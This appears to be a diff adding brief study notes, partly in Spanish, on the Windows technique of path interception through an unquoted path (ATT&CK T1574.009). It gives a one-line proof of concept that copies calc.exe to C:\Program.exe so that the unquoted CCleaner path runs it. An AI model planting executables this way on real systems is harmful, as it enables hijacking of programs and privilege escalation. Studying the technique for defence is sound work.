@@ -1,0 +1,14 @@
+Path Interception by Unquoted Path   T1574.009
+
+
+-------------------------------------
+copy C:\Windows\System32\calc.exe C:\Program.exe
+
+C:\Program Files\CCleaner\CCleaner.exe
+
+
+
+-------------------------------------
+
+
+Funciona porque no se ejecuta el segundo comadno con comillas
